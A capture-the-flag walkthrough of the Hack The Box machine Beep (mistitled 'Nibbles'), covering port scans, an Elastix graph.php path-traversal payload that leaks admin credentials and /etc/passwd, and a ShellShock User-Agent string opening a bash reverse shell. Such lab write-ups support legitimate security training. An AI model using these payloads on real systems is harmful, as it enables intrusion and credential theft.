# Hack The Box - Nibbles Walkthrough without Metasploit

## Reconnaissance
Retrieving the IP address of the machine, I started a quick inital Nmap scan to see which ports are open and which services are running on those ports.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/beep]
└─$ sudo nmap -sC -sV -O -oA nmap/initial 10.10.10.7 -Pn
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-11 02:58 EST
Nmap scan report for 10.10.10.7
Host is up (0.12s latency).
Not shown: 988 closed tcp ports (reset)
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 4.3 (protocol 2.0)
| ssh-hostkey: 
|   1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 (DSA)
|_  2048 bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d (RSA)
25/tcp    open  smtp       Postfix smtpd
|_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN
80/tcp    open  http       Apache httpd 2.2.3
|_http-server-header: Apache/2.2.3 (CentOS)
|_http-title: Did not follow redirect to https://10.10.10.7/
110/tcp   open  pop3       Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_pop3-capabilities: IMPLEMENTATION(Cyrus POP3 server v2) UIDL PIPELINING EXPIRE(NEVER) LOGIN-DELAY(0) USER STLS TOP AUTH-RESP-CODE APOP RESP-CODES
|_sslv2: ERROR: Script execution failed (use -d to debug)
111/tcp   open  rpcbind    2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1            875/udp   status
|_  100024  1            878/tcp   status
143/tcp   open  imap       Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_sslv2: ERROR: Script execution failed (use -d to debug)
|_imap-capabilities: QUOTA Completed X-NETSCAPE URLAUTHA0001 NO UNSELECT OK CATENATE THREAD=REFERENCES SORT=MODSEQ LISTEXT MULTIAPPEND LIST-SUBSCRIBED NAMESPACE IDLE CHILDREN UIDPLUS CONDSTORE SORT THREAD=ORDEREDSUBJECT ANNOTATEMORE MAILBOX-REFERRALS BINARY ID RENAME IMAP4 RIGHTS=kxte ACL IMAP4rev1 ATOMIC LITERAL+ STARTTLS
|_imap-ntlm-info: ERROR: Script execution failed (use -d to debug)
443/tcp   open  ssl/http   Apache httpd 2.2.3 ((CentOS))
|_ssl-date: 2023-01-11T09:02:14+00:00; +1h00m04s from scanner time.
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2017-04-07T08:22:08
|_Not valid after:  2018-04-07T08:22:08
|_http-server-header: Apache/2.2.3 (CentOS)
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Elastix - Login page
993/tcp   open  ssl/imap   Cyrus imapd
|_imap-capabilities: CAPABILITY
995/tcp   open  pop3       Cyrus pop3d
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_ssl-known-key: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
|_sslv2: ERROR: Script execution failed (use -d to debug)
3306/tcp  open  mysql      MySQL (unauthorized)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_sslv2: ERROR: Script execution failed (use -d to debug)
4445/tcp  open  upnotifyp?
10000/tcp open  http       MiniServ 1.570 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Device type: general purpose|WAP|media device|PBX|specialized|printer
Running (JUST GUESSING): Linux 2.6.X|2.4.X (95%), Linksys embedded (95%), Osmosys embedded (93%), Riverbed RiOS (93%), HP embedded (93%), Enterasys embedded (93%), Netgear embedded (93%)
OS CPE: cpe:/o:linux:linux_kernel:2.6.27 cpe:/h:linksys:wrv54g cpe:/o:linux:linux_kernel:2.6.18 cpe:/o:linux:linux_kernel:2.4.32 cpe:/o:riverbed:rios cpe:/h:enterasys:ap3620 cpe:/h:netgear:eva9100
Aggressive OS guesses: Linux 2.6.27 (95%), Linux 2.6.9 - 2.6.30 (95%), Linux 2.6.18 (95%), Linux 2.6.5 - 2.6.12 (95%), Linux 2.6.6 (95%), Linksys WRV54G WAP (95%), Linux 2.6.9 - 2.6.24 (95%), Linux 2.6.27 (likely embedded) (95%), Linux 2.6.20-1 (Fedora Core 5) (95%), Linux 2.6.22 - 2.6.23 (95%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Hosts:  beep.localdomain, 127.0.0.1, example.com

Host script results:
|_clock-skew: 1h00m03s

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 333.54 seconds

```

We get back the following result showing that 12 ports are open:
- Port `22`: running `OpenSSH 4.3`
- Port `25`: running `Postfix smtpd`
- Port `80`: running `Apache httpd 2.2.3`
- Port `110`: running `Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7–7.el5_6.4`
- Port `111`: running `rpcbind`
- Port `143`: running `Cyrus imapd 2.3.7-Invoca-RPM-2.3.7–7.el5_6.4`
- Port `443`: running `HTTPS`
- Port `993`: running `Cyrus imapd`
- Port `995`: running `Cyrus pop3d`
- Port `3306`: running `MySQL`
- Port `4445`: running `upnotifyp`
- Port `10000`: running `MiniServ 1.570 (Webmin httpd)`

Before starting enumeration, I ran a more comprehensive nmap scan in the background to make sure that I did not miss anything.

So I ran an Nmap scan that covers all ports.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/beep]
└─$ sudo nmap -sC -sV -O -p- -oA nmap/initial 10.10.10.7 -Pn

[sudo] password for darshan: 
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-11 03:00 EST
Stats: 0:04:02 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 54.33% done; ETC: 03:07 (0:03:23 remaining)
Nmap scan report for 10.10.10.7
Host is up (0.13s latency).
Not shown: 65519 closed tcp ports (reset)
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 4.3 (protocol 2.0)
| ssh-hostkey: 
|   1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 (DSA)
|_  2048 bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d (RSA)
25/tcp    open  smtp       Postfix smtpd
|_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN
80/tcp    open  http       Apache httpd 2.2.3
|_http-server-header: Apache/2.2.3 (CentOS)
|_http-title: Did not follow redirect to https://10.10.10.7/
110/tcp   open  pop3       Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_pop3-capabilities: STLS RESP-CODES EXPIRE(NEVER) LOGIN-DELAY(0) PIPELINING UIDL IMPLEMENTATION(Cyrus POP3 server v2) APOP USER AUTH-RESP-CODE TOP
|_sslv2: ERROR: Script execution failed (use -d to debug)
111/tcp   open  rpcbind    2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1            875/udp   status
|_  100024  1            878/tcp   status
143/tcp   open  imap       Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_imap-capabilities: MULTIAPPEND THREAD=REFERENCES QUOTA STARTTLS OK URLAUTHA0001 X-NETSCAPE LIST-SUBSCRIBED RENAME BINARY LITERAL+ MAILBOX-REFERRALS NAMESPACE CONDSTORE UNSELECT ACL UIDPLUS ANNOTATEMORE THREAD=ORDEREDSUBJECT IMAP4 ID SORT=MODSEQ ATOMIC Completed CHILDREN LISTEXT CATENATE IDLE RIGHTS=kxte IMAP4rev1 NO SORT
|_imap-ntlm-info: ERROR: Script execution failed (use -d to debug)
|_sslv2: ERROR: Script execution failed (use -d to debug)
443/tcp   open  ssl/http   Apache httpd 2.2.3 ((CentOS))
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2017-04-07T08:22:08
|_Not valid after:  2018-04-07T08:22:08
|_http-title: Elastix - Login page
|_http-server-header: Apache/2.2.3 (CentOS)
|_ssl-date: 2023-01-11T09:12:09+00:00; +1h00m03s from scanner time.
| http-robots.txt: 1 disallowed entry 
|_/
878/tcp   open  status     1 (RPC #100024)
993/tcp   open  ssl/imap   Cyrus imapd
|_imap-capabilities: CAPABILITY
995/tcp   open  pop3       Cyrus pop3d
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_ssl-known-key: ERROR: Script execution failed (use -d to debug)
|_sslv2: ERROR: Script execution failed (use -d to debug)
3306/tcp  open  mysql      MySQL (unauthorized)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
|_sslv2: ERROR: Script execution failed (use -d to debug)
4190/tcp  open  sieve      Cyrus timsieved 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4 (included w/cyrus imap)
4445/tcp  open  upnotifyp?
4559/tcp  open  hylafax    HylaFAX 4.3.10
5038/tcp  open  asterisk   Asterisk Call Manager 1.1
10000/tcp open  http       MiniServ 1.570 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=1/11%OT=22%CT=1%CU=40378%PV=Y%DS=2%DC=I%G=Y%TM=63BE6FC
OS:2%P=x86_64-pc-linux-gnu)SEQ(SP=BB%GCD=1%ISR=C2%TI=Z%CI=Z%II=I%TS=A)OPS(O
OS:1=M539ST11NW7%O2=M539ST11NW7%O3=M539NNT11NW7%O4=M539ST11NW7%O5=M539ST11N
OS:W7%O6=M539ST11)WIN(W1=16A0%W2=16A0%W3=16A0%W4=16A0%W5=16A0%W6=16A0)ECN(R
OS:=Y%DF=Y%T=40%W=16D0%O=M539NNSNW7%CC=N%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%
OS:RD=0%Q=)T2(R=N)T3(R=Y%DF=Y%T=40%W=16A0%S=O%A=S+%F=AS%O=M539ST11NW7%RD=0%
OS:Q=)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%
OS:A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%
OS:DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIP
OS:L=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: Hosts:  beep.localdomain, 127.0.0.1, example.com, localhost; OS: Unix

Host script results:
|_clock-skew: 1h00m02s

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

```

Four other ports are open.

- Port `878`: running `status`
- Port `4190`: running `Cyrus timsieved 2.3.7-Invoca-RPM-2.3.7–7.el5_6.4`
- Port `4559`: running `HylaFAX 4.3.10`
- Port `5038`: running `Asterisk Call Manager 1.1`


Before moving on to `enumeration`, I made a few notes about the nmap scan results.
- The `OpenSSH` version that is running on port `22` is pretty `old`. We’re used to seeing `OpenSSH` version `7.2`. So it would be a good idea to check `searchsploit` to see if any `critical vulnerabilities` are associated with this version.
- Ports `25`, `110`, `143`, `995` are running `mail protocols`. We might need to find a `valid email address` to further enumerate these services. 
- Port `4190` running `Cyrus timsieved 2.3.7` seems to be associated to `imapd`.
- Port `111` is running `RPCbind`. I don’t know much about this service but we can start enumerating it using the `rpcinfo` command that makes a call to the `RPC server` and reports what it finds. 
- Port `878` running the status service is associated to this.
- Ports `80`, `443` and `10000` are running `web servers`. Port `80` seems to redirect to port `443` so we only have `two` `web servers` to enumerate.
- Port `3306` is running `MySQL` database. There is a lot of enumeration potential for this service.
- Port `4559` is running `HylaFAX 4.3.10`. According to this, `HylaFAX` is running an `open source fax server` which allows sharing of fax equipment among computers by offering its service to clients by a protocol similar to FTP. We’ll have to check the version number to see if it is associated with any critical exploits.
- Port 5038 is running running Asterisk Call Manager 1.1. Again, we’ll have to check the version number to see if it is associated with any critical exploits.
- I’m not sure what the `upnotifyp` service on port `4445` does.

## Enumeration
As usual, I always start with enumerating `HTTP` first. In this case we have two web servers running on ports `443` and `10000`.

### Visiting the wesbite on Port `443`
![bp-1](https://user-images.githubusercontent.com/87711310/211753799-e6b592ad-8b79-43d7-a5b7-a46d3dce18bd.png)

I found a `Elastix` login page, that pretty much looked legit. `Elastix` is an `unified communications server software` that brings together `IP PBX`, `email`, `IM`, `faxing` and collaboration functionality

Further enumerating the page, the page does not have the `version` number of the software being used so I right clicked the site and visited the `View Page source`. I didn’t find anything there too.

So, I guess it was time to enumerate directories to find more information about the site using `gobuster`.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/beep]
└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u https://10.10.10.7/ -k
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://10.10.10.7/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2023/01/11 03:22:52 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 310] [--> https://10.10.10.7/images/]
/help                 (Status: 301) [Size: 308] [--> https://10.10.10.7/help/]  
/themes               (Status: 301) [Size: 310] [--> https://10.10.10.7/themes/]
/modules              (Status: 301) [Size: 311] [--> https://10.10.10.7/modules/]
/mail                 (Status: 301) [Size: 308] [--> https://10.10.10.7/mail/]   
/admin                (Status: 301) [Size: 309] [--> https://10.10.10.7/admin/]  
/static               (Status: 301) [Size: 310] [--> https://10.10.10.7/static/] 
/lang                 (Status: 301) [Size: 308] [--> https://10.10.10.7/lang/]   
/var                  (Status: 301) [Size: 307] [--> https://10.10.10.7/var/]    
/panel                (Status: 301) [Size: 309] [--> https://10.10.10.7/panel/]  
/libs                 (Status: 301) [Size: 308] [--> https://10.10.10.7/libs/]   
/recordings           (Status: 301) [Size: 308] [--> https://10.10.10.7/recordings/] 
/configs              (Status: 301) [Size: 308] [--> https://10.10.10.7/configs/]
/vtigercrm            (Status: 301) [Size: 308] [--> https://10.10.10.7/vtigercrm/]

===============================================================
2023/01/11 03:49:06 Finished
===============================================================
          
```
Visiting these directories, I found a different kinds of login pages on most of the directories.

![bp-2](https://user-images.githubusercontent.com/87711310/211762869-f16b22b9-d204-4f66-8d4d-35496ea6d821.png)

![bp-3](https://user-images.githubusercontent.com/87711310/211762880-8c99f00b-37f0-4345-857f-f80695468b81.png)


I looked up in the `/admin` directory and tried common & default credentials on all the login forms I found and didn't get anywhere

So i decided to use `searchsploit` to determine if `elastix` was associated with any vulnerabilities
```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/beep]
└─$ searchsploit elastix                                    
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                            |  Path
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Elastix - 'page' Cross-Site Scripting                                                                                     | php/webapps/38078.py
Elastix - Multiple Cross-Site Scripting Vulnerabilities                                                                   | php/webapps/38544.txt
Elastix 2.0.2 - Multiple Cross-Site Scripting Vulnerabilities                                                             | php/webapps/34942.txt
Elastix 2.2.0 - 'graph.php' Local File Inclusion                                                                          | php/webapps/37637.pl
Elastix 2.x - Blind SQL Injection                                                                                         | php/webapps/36305.txt
Elastix < 2.5 - PHP Code Injection                                                                                        | php/webapps/38091.php
FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution                                                                    | php/webapps/18650.py
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results                       
```

Here are few points that made:
1. Cross-site scripting exploits are not very useful since they are client side attacks and therefore require end user interaction.
2. The remote code execution and local file inclusion vulnerabilities are definetely interesting.
3. The Blind SQL Injection is on the iridium_threed.php script that the server doesn’t seem to load. Plus it seems like it requires a customer to authenticate, so I’m going to avoid this exploit unless I get valid authentication credentials.
4. The PHP Code Injection exploit is in the vtigercrm directory where the LFI vulnerability exists as well.
5. So we’ll only look into that if the LFI vulnerability does not pan out.


### Visiting the wesbite on Port `10000`

I kept these in mind and visited the `web-server` on port `10000`

![bp-4](https://user-images.githubusercontent.com/87711310/211763386-79f5b94e-5a66-4efa-a299-3be91c42f491.png)

This also seems to be an `off the shelf software` and therefore the first thing I’m going to do is run `searchsploit` on it.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/beep]
└─$ searchsploit webmin 
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                            |  Path
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
DansGuardian Webmin Module 0.x - 'edit.cgi' Directory Traversal                                                           | cgi/webapps/23535.txt
phpMyWebmin 1.0 - 'target' Remote File Inclusion                                                                          | php/webapps/2462.txt
phpMyWebmin 1.0 - 'window.php' Remote File Inclusion                                                                      | php/webapps/2451.txt
Webmin - Brute Force / Command Execution                                                                                  | multiple/remote/705.pl
webmin 0.91 - Directory Traversal                                                                                         | cgi/remote/21183.txt
Webmin 0.9x / Usermin 0.9x/1.0 - Access Session ID Spoofing                                                               | linux/remote/22275.pl
Webmin 0.x - 'RPC' Privilege Escalation                                                                                   | linux/remote/21765.pl
Webmin 0.x - Code Input Validation                                                                                        | linux/local/21348.txt
Webmin 1.5 - Brute Force / Command Execution                                                                              | multiple/remote/746.pl
Webmin 1.5 - Web Brute Force (CGI)                                                                                        | multiple/remote/745.pl
Webmin 1.580 - '/file/show.cgi' Remote Command Execution (Metasploit)                                                     | unix/remote/21851.rb
Webmin 1.850 - Multiple Vulnerabilities                                                                                   | cgi/webapps/42989.txt
Webmin 1.900 - Remote Command Execution (Metasploit)                                                                      | cgi/remote/46201.rb
Webmin 1.910 - 'Package Updates' Remote Command Execution (Metasploit)                                                    | linux/remote/46984.rb
Webmin 1.920 - Remote Code Execution                                                                                      | linux/webapps/47293.sh
Webmin 1.920 - Unauthenticated Remote Code Execution (Metasploit)                                                         | linux/remote/47230.rb
Webmin 1.962 - 'Package Updates' Escape Bypass RCE (Metasploit)                                                           | linux/webapps/49318.rb
Webmin 1.973 - 'run.cgi' Cross-Site Request Forgery (CSRF)                                                                | linux/webapps/50144.py
Webmin 1.973 - 'save_user.cgi' Cross-Site Request Forgery (CSRF)                                                          | linux/webapps/50126.py
Webmin 1.984 - Remote Code Execution (Authenticated)                                                                      | linux/webapps/50809.py
Webmin 1.x - HTML Email Command Execution                                                                                 | cgi/webapps/24574.txt
Webmin < 1.290 / Usermin < 1.220 - Arbitrary File Disclosure                                                              | multiple/remote/1997.php
Webmin < 1.290 / Usermin < 1.220 - Arbitrary File Disclosure                                                              | multiple/remote/2017.pl
Webmin < 1.920 - 'rpc.cgi' Remote Code Execution (Metasploit)                                                             | linux/webapps/47330.rb
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

And... I got back a lot of vulnerabilities.

One thing to notice is that several of the vulnerabilities mention `cgi scripts`, which if you've read my [HTB-Shocker]() writeup, you should know that the first thing you should try is the `ShellShock` vulnerability.

This vulnerability affected web servers utilizing CGI (Common Gateway Interface), which is a system for generating dynamic web content. If it turns out to be not vulnerable to `ShellShock`, searchsploit returned a bunch of other exploits we can try.

Based on the information I found from enumerating this box, I think this box might have more than one solution. So I decided to figure out all the possible solutions to this box.

## Solution 1
Since we saw that the `Elastix` was vulnerable to LFI, I decided to go with it first, as exploiting a web-page using `LFI` is always easier than carrying out other attacks

```
Elastix 2.2.0 - 'graph.php' Local File Inclusion | php/webapps/37637.pl
```
I used the above mentioned module, and looking at the module, i found out the payload they used.

```
/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action
```

here, `/etc/amportal.conf` is the system file in the Elastix software.

So I visited the web-page, entered the payload, executed it and this is what I get.

![bp-5](https://user-images.githubusercontent.com/87711310/211778610-ef428b7f-03e9-4c5f-9cbc-6ddcf678f8f5.png)

It was unreadable so I tried viewing the source-code of the page hoping that it might have the code with proper indentation and formatting and here's what i got.

![bp-6](https://user-images.githubusercontent.com/87711310/211778602-d7efa8e0-df30-478b-a32a-2e4578d090b7.png)

After going through the source-code, I found the credentials for the `admin` user.

![bp-7](https://user-images.githubusercontent.com/87711310/211778608-07cbfbb1-be1e-4d74-875b-2df7e281d389.png)

And i'm in `index.php` or `admin's dashboard`

![bp-8](https://user-images.githubusercontent.com/87711310/211779417-1020d1e7-c849-4cbb-ba83-10eadf041502.png)

So now I tried to ssh into system using `admin's credentials` but I couldn't

So using the same payload, I tried to look at the contents of `/etc/passwd` to get the list of the users on the machine

![bp-9](https://user-images.githubusercontent.com/87711310/211780984-27efca25-c799-44f0-a7b5-a900905df446.png)

And after filtering through the results, these are the ones I could use.

```
root:x:0:0:root:/root:/bin/bash
mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bash
cyrus:x:76:12:Cyrus IMAP Server:/var/lib/imap:/bin/bash
asterisk:x:100:101:Asterisk VoIP PBX:/var/lib/asterisk:/bin/bash
spamfilter:x:500:500::/home/spamfilter:/bin/bash
fanis:x:501:501::/home/fanis:/bin/bash
```

And since `admin` is similar to `root`, I tried ssh-ing to the `root` user with the admin's credentials we retrieve.

So whule logging in as root through `ssh` i encountered an unusual error.
```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/beep]
└─$ ssh root@10.10.10.7      
Unable to negotiate with 10.10.10.7 port 22: no matching key exchange method found. Their offer: diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1 
```

After restarting the box, connecting to the VPN again after disconnecting it, I googled the issue and found a quick fix

```
sh -oKexAlgorithms=+diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-rsa root@10.10.10.7 
```

You just had to exchange the diffie-hellman and rsa keys with the IP.
After doing this and entering the password, I was in!!!

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/beep]
└─$ ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-rsa root@10.10.10.7 
The authenticity of host '10.10.10.7 (10.10.10.7)' can't be established.
RSA key fingerprint is SHA256:Ip2MswIVDX1AIEPoLiHsMFfdg1pEJ0XXD5nFEjki/hI.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.7' (RSA) to the list of known hosts.
root@10.10.10.7's password: 
Last login: Tue Jul 16 11:45:47 2019

Welcome to Elastix 
----------------------------------------------------

To access your Elastix System, using a separate workstation (PC/MAC/Linux)
Open the Internet Browser using the following URL:
http://10.10.10.7

[root@beep ~]# whoami
root

```

Obtaining the `user` and `root` flag is very simple from here on!

```
[root@beep ~]# whoami
root
[root@beep ~]# pwd
/root
[root@beep ~]# cat root.txt
[REDACTED]
[root@beep ~]# cd home
-bash: cd: home: No such file or directory
[root@beep ~]# ls
anaconda-ks.cfg  elastix-pr-2.2-1.i386.rpm  install.log  install.log.syslog  postnochroot  root.txt  webmin-1.570-1.noarch.rpm
[root@beep ~]# cd ..
[root@beep /]# ls
bin  boot  dev  etc  home  lib  lost+found  media  mnt  opt  proc  root  sbin  selinux  srv  sys  tftpboot  tmp  usr  var
[root@beep /]# cd home
[root@beep home]# ls
fanis  spamfilter
[root@beep home]# cd fanis
[root@beep fanis]# ls
user.txt
[root@beep fanis]# cat user.txt
[REDACTED]
```



## Solution 2
This attack works on web server involving port `10000`

First, visit the webmin application.

Then intercept the request in Burp and send it to Repeater. Change the User Agent field to the following string

```
() { :;}; bash -i >& /dev/tcp/<Your IP>/4444 0>&1
```
![bp-10](https://user-images.githubusercontent.com/87711310/211785051-18da65c1-47e8-42d8-856f-276fe272cf3f.png)

What that does is it exploits the ShellShock vulnerability and sends a reverse shell back to our attack machine. If you’re not familiar with ShellShock, the following image explains it really well.


![bp-12](https://user-images.githubusercontent.com/87711310/211785043-8b111ce7-3a4d-4ba5-9231-39ae83653c8d.png)

Once you've sent the request to Repeater and changed the `User-Agent` to the given string, set up a listener to receive a reverse shell.

```
nc -lvnp
```

Once you hit send to the request from the Repeaterm checking on the listener you had set up, you see a root shell

![bp-11](https://user-images.githubusercontent.com/87711310/211785058-47a3fa0d-4826-4d9c-88b1-736b8d672921.png)

You can now retrieve the flag.
